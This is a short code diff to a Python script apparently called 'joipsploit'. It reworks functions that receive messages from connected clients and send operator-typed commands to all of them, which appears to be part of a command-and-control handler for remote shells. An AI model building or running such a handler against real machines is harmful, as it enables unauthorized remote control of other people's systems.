@@ -18,17 +18,22 @@ clients = []
 
 def receiveMessage(client):
     while True:
-        message = client.recv(2048).decode('ascii')
-        print("\n"+message+"\n")
+        message = client.recv(2048).decode()
+        print("\n"+message)
+        print(f"{red}({os.getlogin()}@joipsploit){white}> ")
 
 
 def sendMessage():
     while True:
-        try:
-            for client in clients:
-                client.send(input(f"{red}{os.getLogin()}@joipsploit){white}> ").encode('ascii'))
-        except:
-            print("Error sending command")
+     #   try:
+        for client in clients:
+            try:
+                msg = input(f"{red}({os.getlogin()}@joipsploit){white}> ")
+                client.send(msg.encode())
+            except:
+                print(red+"Error sending command")
+        #except:
+           # print("Error sending command")
 
 def getSignal():
     while True:
